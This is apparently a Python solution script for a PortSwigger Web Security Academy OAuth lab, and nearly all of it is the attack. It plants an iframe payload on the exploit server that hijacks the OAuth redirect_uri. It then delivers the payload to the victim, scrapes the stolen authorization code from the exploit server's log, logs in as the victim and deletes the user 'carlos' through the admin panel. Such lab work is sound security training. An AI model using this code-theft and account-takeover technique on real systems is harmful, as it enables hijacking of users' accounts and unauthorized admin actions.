import sys
import requests
import re

print("While testing this challenge, I had many times that the bots did not work. Even when I clicked manually. Also if it doesn't work it's not a bug in my code. It's an error on the part of portswigger")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
first_part = burp_url + '/social-login'
logout_url = burp_url + '/logout'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36'})
response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)
logs_url = exploit_server + '/log'

response = session.get(first_part)
second_part = re.search(r"content='3;url=(.*?)'>",response.text).group(1)
index_second_equal = second_part.find('=', second_part.find('=') + 1)
poczatek = second_part[:index_second_equal + 1]

#social_login = second_part + '/login'

#burp_data = {"username": "wiener", "password": "peter"}
#session.post(social_login, data=burp_data)
#session.get(logout_url)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<iframe src=\"{poczatek}{exploit_server}&response_type=code&scope=openid%20profile%20email\"></iframe>\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

session.get(exploit_server+'/deliver-to-victim')

response = session.get(logs_url)
final_code = re.search(r'\?code=(\S+)', response.text).group(1)

final_url = burp_url + '/oauth-callback?code=' + final_code
session.get(final_url)
session.get(delete_url)

